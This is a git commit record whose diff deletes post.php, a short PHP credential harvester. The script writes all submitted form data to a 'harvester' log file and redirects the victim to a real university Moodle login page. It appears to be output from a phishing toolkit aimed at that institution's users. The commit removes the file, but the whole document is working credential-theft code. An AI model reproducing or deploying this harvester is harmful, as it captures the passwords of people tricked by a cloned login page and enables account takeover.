62663df7fa755bf31a77628506219b5b8614c57e
Cinol123 <147175235+Cinol123@users.noreply.github.com>
2024-03-12 21:18:53 +0100

    Delete post.php

--- post.php
+++
@@ -1,2 +0,0 @@
-<?php $file = 'harvester_2024-03-12 15:38:11.634470.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
-/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=https://cez2.wi.pb.edu.pl/moodle/login/index.php" />
